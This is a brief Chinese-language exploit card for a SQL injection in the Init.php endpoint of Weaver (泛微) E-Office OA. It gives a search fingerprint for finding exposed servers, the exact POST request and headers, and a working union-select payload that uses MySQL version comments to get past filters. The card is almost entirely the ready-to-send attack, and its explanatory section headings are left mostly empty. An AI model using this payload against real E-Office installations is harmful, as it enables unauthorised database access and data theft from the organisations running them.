# 泛微E-OfficeInit.phpSQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="泛微 e-office OA"`
- **请求**：`POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: LOGIN_LANG=cn; PHPSESSID=3005e422d8ad228271b06c365f6d2987`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 60`

**请求体 / payload**
```
cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#
```

**其他**
- 泛微 E-Office Init.php SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微E-office